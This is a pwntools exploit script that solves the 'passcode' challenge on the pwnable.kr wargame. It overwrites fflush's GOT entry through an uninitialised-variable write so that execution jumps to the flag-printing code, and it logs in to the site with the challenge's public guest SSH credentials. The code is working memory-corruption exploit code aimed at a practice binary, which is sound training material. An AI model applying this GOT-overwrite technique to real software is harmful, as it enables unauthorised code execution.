#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./passcode
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './passcode')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        s = ssh(user='passcode', host='pwnable.kr', password='guest', port=2222)
        return s.process('./passcode')
    elif args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

# ebp-0xc - passcode2
# ebp-0x10 - passcode1
# ebp-0x70 - buffer acess

# loading passcode1 value with got address of fflush
padding = 0x60*b'a'
payload = padding + p32(exe.got['fflush'])
io.sendline(payload)

# Loading got address of fflush with print flag starting address
print_flag_addr = exe.symbols['login'] + 168
payload = str(print_flag_addr).encode()
io.sendline(payload)

io.interactive()
